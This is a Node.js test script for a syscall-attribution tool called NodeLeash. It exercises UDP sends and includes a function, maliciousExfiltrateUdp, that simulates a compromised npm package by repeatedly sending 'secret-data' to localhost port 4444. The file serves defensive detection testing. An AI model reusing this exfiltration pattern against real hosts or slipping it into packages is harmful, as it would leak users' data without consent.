'use strict';

// ============================================================================
// Example 13-udp-test — Category 3 UDP attribution test
//
// Tests three scenarios in a single file:
//   1. Unconnected UDP send   → uv_udp_init + uv_udp_send
//   2. Connected UDP socket   → uv_udp_init + uv_udp_connect
//   3. UDP from inline pkg    → attribution to maliciousExfiltrateUdp
//
// Expected policy:
//   app.js → socket, sendto  (scenario 1)
//   app.js → socket, connect (scenario 2)
//   app.js → socket, sendto  (scenario 3, attributed to maliciousExfiltrateUdp)
//
// Run with:
//   node --perf-basic-prof --interpreted-frames-native-stack app.js &
//   sudo ./nodeleash analyze $!
// ============================================================================

const dgram = require('dgram');

console.log(`PID: ${process.pid}`);

// ─────────────────────────────────────────────────────────────────────────────
// Simulates a compromised npm package that exfiltrates data via UDP.
// Defined as a named function so NodeLeash can attribute it separately
// from the legitimate app code above.
// Expected: socket + sendto attributed to this function's call path
// ─────────────────────────────────────────────────────────────────────────────
function maliciousExfiltrateUdp(data) {
    console.log('[malicious] exfiltrating via UDP...');
    const socket = dgram.createSocket('udp4');
    const payload = Buffer.from(`EXFIL:${data}:${Date.now()}`);
    socket.send(payload, 0, payload.length, 4444, '127.0.0.1', function(err) {
        if (err) {
            console.log(`[malicious] UDP send error (expected): ${err.message}`);
        } else {
            console.log('[malicious] UDP exfiltration sent ✓');
        }
        socket.close();
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 1 — Unconnected UDP send
// Tests: uv_udp_init (ENTRY) + uv_udp_send (TRANSFER)
// Expected: socket + sendto attributed to app.js
// ─────────────────────────────────────────────────────────────────────────────
function testUnconnectedUdp() {
    console.log('[scenario 1] unconnected UDP send...');
    const socket = dgram.createSocket('udp4');
    const message = Buffer.from('hello from unconnected UDP');
    socket.send(message, 0, message.length, 9999, '127.0.0.1', function(err) {
        if (err) {
            console.log(`[scenario 1] send error (expected): ${err.message}`);
        } else {
            console.log('[scenario 1] unconnected UDP send ✓');
        }
        socket.close();
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 2 — Connected UDP socket
// Tests: uv_udp_init (ENTRY) + uv_udp_connect (TRANSFER)
// Expected: socket + connect attributed to app.js
// ─────────────────────────────────────────────────────────────────────────────
function testConnectedUdp() {
    console.log('[scenario 2] connected UDP...');
    const socket = dgram.createSocket('udp4');
    socket.connect(9999, '127.0.0.1', function() {
        console.log('[scenario 2] UDP connect ✓');
        const message = Buffer.from('hello from connected UDP');
        socket.send(message, function(err) {
            if (err) {
                console.log(`[scenario 2] send error (expected): ${err.message}`);
            }
            socket.close();
        });
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Scenario 3 — UDP from simulated malicious package
// Tests: attribution separates maliciousExfiltrateUdp from app.js context
// Expected: socket + sendto attributed to maliciousExfiltrateUdp call path
// ─────────────────────────────────────────────────────────────────────────────
function testMaliciousUdp() {
    console.log('[scenario 3] malicious UDP exfiltration...');
    maliciousExfiltrateUdp('secret-data');
}

// Run all scenarios once at startup with staggered delay
setTimeout(testUnconnectedUdp, 1000);
setTimeout(testConnectedUdp,   3000);
setTimeout(testMaliciousUdp,   5000);

// Repeat all exfiltrations every 5 seconds
setInterval(() => {
    testUnconnectedUdp();
    testConnectedUdp();
    testMaliciousUdp();
}, 5000);